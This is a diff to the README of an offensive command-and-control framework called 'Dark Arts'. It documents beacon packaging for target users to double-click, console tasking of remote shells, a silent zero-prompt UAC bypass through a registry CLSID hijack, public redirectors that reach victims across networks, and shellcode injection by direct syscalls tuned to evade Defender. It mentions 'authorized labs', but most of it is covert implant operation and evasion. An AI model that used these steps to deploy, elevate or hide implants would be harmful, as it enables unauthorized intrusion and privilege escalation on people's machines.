@@ -149,7 +149,7 @@ curl -s -X POST http://127.0.0.1:9002/api/v1/sessions \
   -d '{"id":"cfa570c653bd212b10a9cb551fd7a1b4","agent_pub":"ce8d3ad1ccb633ec7b70c17814a5c76ecd029685050d344745ba05870e587d59"}'
 ```
 
-To use a fresh seed, compute the public key with a short Go helper (ed25519 from the seed) or copy the `sid` from the beacon log and derive the pubkey with the same helper — the server refuses a touch without the correct `agent_pub`.
+To use a fresh seed, generate the identity with `go run ./cmd/genid <64-hex-seed>` — the server refuses a touch without the correct `agent_pub`. On the console, `touch <sid> <pub_hex>` does the same registration.
 
 ### 5. Operate with the console
 
@@ -262,14 +262,7 @@ dark-arts> sessions          # the laptop's sid shows a recent last-seen
 dark-arts> uactest <sid>
 ```
 
-First result waits for the stock Windows `UnifiedConsentSyncTask` daily fire (12:00±2h, or at wake-up) that bootstraps the channel; the console prints the on-laptop verification checklist if it times out. After the first fire, every `uac` command returns in seconds, fully silent:
-
-```
-dark-arts> uactest <sid>                 # whoami /groups elevated
-dark-arts> task <sid> uac cmd=net user
-```
-
-One-time-prompt fallback: `task <sid> uac method=schtasks cmd=whoami /groups`.
+First result waits for the stock Windows `UnifiedConsentSyncTask` daily fire (12:00±2h, or at wake-up) that bootstraps the channel; the console prints the on-laptop verification checklist if it times out. After the first fire, every `uac` command returns in seconds, fully silent. Mechanism, fallbacks (`method=schtasks` for Win10 or when speed matters) and caveats: see the "Silent elevation (`uac`)" section under "Deploying to a Windows laptop".
 
 ### 8. Routine operation
 
@@ -284,11 +277,7 @@ dark-arts> kill <sid>
 
 ### 9. Teardown
 
-```powershell
-lab\stop-lab.cmd        # or: docker compose -f lab/docker-compose.yml down -v
-```
-
-To un-arm the daily channel on a laptop: delete the HKCU CLSID override key, `%TEMP%\darts_ucd.dll`, `%TEMP%\darts-uac-work.txt`, and `schtasks /Delete /TN \DarkArts-uac /F`.
+`lab\stop-lab.cmd` (or `docker compose -f lab/docker-compose.yml down -v` — see [Teardown](#teardown)). To un-arm the daily channel on a laptop, see the teardown note in the "Silent elevation (`uac`)" section.
 
 ## Deploying to a Windows laptop
 
@@ -308,7 +297,7 @@ The script prints the generated seed (keep it to redeploy the same identity late
 | Flag | Meaning |
 |---|---|
 | `-Seed <64-hex>` | rebuild/register a specific identity (default: random) |
-| `-Edge "http://ip:7443,https://...trycloudflare.com"` | explicit edge list (default: auto-detected LAN IP) |
+| `-Edge "https://<vps>:443,http://<lab-ip>:7443"` | explicit edge list (default: auto-detected LAN IP) |
 | `-SleepMask` / `-NoInject` | enable the sleep mask / drop the inject TTP |
 | `-ServerUrl` / `-ApiKey` | registration target (default `http://127.0.0.1:9002`, `opkey`) |
 | `-Insecure` | bake `cfgInsecure=true`: skip TLS certificate verification (needed for self-signed redirector certs) |
@@ -316,17 +305,9 @@ The script prints the generated seed (keep it to redeploy the same identity late
 
 This builds a **self-contained `beacon.exe`** (stealth recipe) with the seed, server public key, edge candidate list, 15 s sleep and a `beacon.log` next to it baked in via `-ldflags -X`. The target user just copies the single exe and double-clicks it — no environment variables, no launcher script. `DARKARTS_*` variables still take precedence when set (a comma-separated `DARKARTS_EDGE` overrides the baked list). The script prints the identity and **registers the session itself** (`POST /api/v1/sessions` is idempotent, so re-running just re-touches it). Results appear under the new sid. Use `-NoInject` to build a beacon without the inject TTP if the target's AV objects. Generate identities with `go run ./cmd/genid <seed-hex-64>`.
 
-### Operate everything from the console
+### Operate from the console
 
-`lab\console.cmd` on the lab host sets the right `DARKARTS_SERVER_URL`/`DARKARTS_API_KEY`; then:
-
-```
-dark-arts> package              # build beacon.exe + register the session (fresh identity, auto LAN edge)
-dark-arts> sessions             # confirm the new sid
-dark-arts> task <sid> shell cmd=whoami
-dark-arts> results              # watch for the base64 result
-dark-arts> kill <sid>
-```
+See the command reference in [Quick start](#5-operate-with-the-console) and the walkthrough above; `lab\console.cmd` sets the right `DARKARTS_SERVER_URL`/`DARKARTS_API_KEY`.
 
 ### Silent elevation (`uac`) — the zero-prompt daily channel
 
@@ -394,17 +375,9 @@ Debian 13 VM, external IP `<vps-ip>` in testing. Two gotchas beyond the generic 
    ```
    then re-run `dark-arts> redirector -Reverse darkarts-lab@<vps-ip>`. The whole `redirector -Reverse` run is idempotent — re-running just re-installs, re-verifies and rebuilds. End-to-end verification in testing was `healthz 200` pulled from the VPS through the running tunnel.
 
-### The Cloudflare quick tunnel (stopgap only)
+### The Cloudflare quick tunnel (stopgap, deprecated)
 
-The lab also ships a `tunnel` container that exposes the relay on a public URL with no account:
-
-```sh
-docker compose -f lab/docker-compose.yml up -d tunnel
-docker logs darkarts-tunnel | grep trycloudflare   # -> https://<random>.trycloudflare.com
-curl https://<random>.trycloudflare.com/healthz     # ok
-```
-
-The URL is **ephemeral**: it changes whenever the `tunnel` container restarts and account-less tunnels get throttled by Cloudflare (observed dead after ~13 h of QUIC timeouts; a restart did not recover it). Use the VPS redirector edge for anything real.
+The lab ships a `tunnel` container exposing the relay on an account-less public URL (`docker logs darkarts-tunnel | grep trycloudflare`), but the URL rotates on restart and the tunnels get throttled (observed dead after ~13 h). Use the VPS redirector for anything real.
 
 ## Advanced evasion features
 
@@ -427,9 +400,9 @@ The inject path runs entirely on **direct syscalls** (`pkg/evasion` + `pkg/injec
 - **Threading** — `NtCreateThreadEx` with the proper `ObjectAttributes` (a NULL one AVs on current builds); the kernel's ret-trampoline exits the thread with the stub's `eax` as exit code, read back via `NtQueryInformationThread` (`0x25`) after `NtWaitForSingleObject`.
 - **Buffer lifetime** — the shellcode page is freed **only after the thread completes**: `SelfRun` deliberately leaks the ~4 KiB RX buffer (the thread starts asynchronously; freeing early makes it execute released pages and crash the process with `0xC0000005`), and `RemoteRun` frees after the 30 s wait finishes (a timeout leaks on purpose rather than killing the target).
 
-**Indirect-syscall attempt (reverted):** a true indirect path (SSN + argument shuffle + `jmp` to a `syscall; ret` site inside the loaded ntdll's `.text`, resolved by scanning for `0F 05 C3` with a clean-image stub-tail offset fallback) was implemented and A/B-tested in the lab environment. Result: the indirect path is deterministic-correct only when `invokeSyscall` is called from the shallowest Go frame; through any nested Go function (`call()`/variadic trampoline) the executed syscall number comes back wrong (verified with RWX- and ntdll-gadgets, both failing at call depth ≥ 2 while the identical direct call at any depth returns correct statuses — e.g. `NtClose(0)` → `0xC0000008` 5/5 direct, garbage statuses 5/5 indirect). The direct path is byte-identical in ABI layout (verified by disassembly); the failure is therefore attributed to the lab environment's syscall monitoring (its ntdll is non-stock: `SCPCFG`/`fothk` sections, dual `0F 05 C3 CD 2E C3` stub tails) interfering with syscalls whose origin address/caller relationship it cannot reconcile. The code was reverted to the proven direct path; the gadget-resolution machinery and this finding are documented here for future work.
+**Indirect-syscall attempt (reverted):** a true indirect path (SSN + argument shuffle + `jmp` to a `syscall; ret` site inside the loaded ntdll's `.text`) was implemented and A/B-tested. It was deterministic-correct only when `invokeSyscall` is called from the shallowest Go frame; through any nested Go function the executed syscall number came back wrong (5/5 failures at call depth ≥ 2 while the identical direct call at any depth returns correct statuses). The code was reverted to the proven direct path; this finding is attributed to the lab environment's syscall monitoring (non-stock ntdll: `SCPCFG`/`fothk` sections, dual `0F 05 C3 CD 2E C3` stub tails) and is documented for future work.
 
-Defender caveat: compile-temp artifacts (`go test` binaries, one early sweep-era build) have been flagged by ML engines (`Trojan:Win32/Bearfoos.A!ml`, `Behavior:Win32/DefenseEvasion.A!ml`) and remediated. The stripped, final beacon builds (stealth recipe: `-s -w` + `-trimpath` + `-buildvcs=false` + per-build `-buildid`) have consistently passed — the indirect-syscall path avoids the hooked-API call patterns entirely. This is expected and documented — the inject path is behaviorally loud by design and belongs in authorized labs only.
+Defender caveat: compile-temp artifacts (`go test` binaries, one early build) have been flagged by ML engines (`Trojan:Win32/Bearfoos.A!ml`, `Behavior:Win32/DefenseEvasion.A!ml`) and remediated. The stripped, final beacon builds (stealth recipe: `-s -w` + `-trimpath` + `-buildvcs=false` + per-build `-buildid`) have consistently passed — the direct-syscall path avoids hooked-API call patterns entirely. The inject path is behaviorally loud by design and belongs in authorized labs only.
 
 ### Sleep mask (`pkg/sleepmask`)
 
@@ -500,10 +473,9 @@ gofmt -l .               # must print nothing
 - **Results intermittently missing** — two `beacon.exe` instances running for the same identity (e.g. double-clicked twice) post results to the same blob keys, so every other result lands on a counter the server already consumed and is silently lost. The beacon now takes a single-instance lock (named mutex on Windows) and exits immediately if one is already running — `beacon.log` will show `instance lock: another instance is already running`. Kill all beacon.exe processes and redeploy once.
 - **Result posted but never appears in `/api/v1/results`** — historical counter-collision failure mode, now eliminated: the pump and the beacon delete each blob from the edge store once it is consumed, so a beacon restarted without its state file (reusing counter 0) can no longer collide with a stale blob. If you still see a gap (e.g. from an old store before this fix), purge the sid's `server/` and `beacon/` blobs from the store and restart the server.
 - **Replacing an old beacon whose session has history** — a fresh beacon starts its send counter at 0, but the server's beacon-side counter for that session is already ahead, so the `since` filter strands the new beacon's first results. Reset the session server-side: stop the server, remove the sid from `send`/`sessions` in the server's `state.json` volume, start the server, and re-`touch` the session — then register/deploy the new beacon. Beacon-side state is now per-session (`state-<sid>.json`) so a beacon cannot inherit a previous session's `last_task`/`send_pos` and skip freshly queued tasks.
-- **Beacon works on the lab LAN but not on a foreign WiFi** — the LAN relay IP is only reachable from the lab network. Use the VPS redirector as the primary edge — `dark-arts> redirector -Reverse <user@vps>` provisions it, starts the tunnel, and bakes `https://<vps>:443,http://<lab-ip>:7443` into the package automatically. The Cloudflare quick tunnel is only a stopgap: its URL rotates on restart and account-less tunnels get throttled (observed dead after ~13 h).
+- **Beacon works on the lab LAN but not on a foreign WiFi** — the LAN relay IP is only reachable from the lab network; provision the VPS redirector (see [Cross-network deployment](#cross-network-deployment-vps-redirector)).
 - **`redirector -Reverse` verifies with `healthz returned 502`** — nginx is up but the SSH reverse tunnel isn't established yet (or failed). Check the tunnel window for errors; on the VPS confirm the listener with `ss -tlnp | grep 7443` (a `-R` forward that fails to bind prints `remote port forwarding failed for listen port 7443`).
 - **`setup.sh` dies at `apt-get update` with `Permission denied`** — the SSH user has no root. Give it passwordless sudo: `sudo bash -c 'echo "<user> ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/<user> && chmod 440 /etc/sudoers.d/<user>'` (from a session that already has sudo), then re-run the `redirector` command.
 - **Beacon keeps probing but no `edge switched` log** — with a single edge candidate the probe is skipped entirely (nothing to fall back to); the `Warn` log only appears when at least two candidates are configured.
 - **`Start-Process` (PowerShell) children lack settings** — environment variables set after spawning are not inherited; set them before `Start-Process` or use `cmd /c`.
 - **Beacon cannot write its state file** — it defaults to `./data/beacon` relative to the working directory; set `DARKARTS_STATE_DIR` to a writable path (e.g. `/tmp/beacon-state`) in containers.
-- **After restoring an old edge store** — stale blobs can push a fresh beacon's `last_task` past new counters; wipe the edge store on redeploys.
